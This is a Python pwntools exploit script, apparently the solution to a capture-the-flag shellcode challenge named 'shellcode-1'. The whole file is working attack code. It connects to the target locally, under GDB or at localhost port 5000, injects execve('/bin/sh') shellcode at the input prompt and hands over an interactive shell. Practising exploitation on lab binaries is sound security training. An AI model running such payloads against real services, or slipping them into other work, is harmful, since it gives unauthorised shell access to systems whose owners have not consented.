#!/usr/bin/env python3

from pwn import *

elf = ELF("./shellcode-1")

HOST, PORT = "localhost", 5000

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

MAXSIZE = 200

def main():
    global io
    io = conn()

    io.recvuntil("Enter your shellcode : ")

    shellcode = asm(
        shellcraft.execve("/bin/sh", 0, 0)
    )
    assert(len(shellcode) <= MAXSIZE)

    io.send(shellcode)

    io.interactive()

def conn():
    gdbscript = '''
    '''
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(elf.path, gdbscript=gdbscript)
    else:
        p = process(elf.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
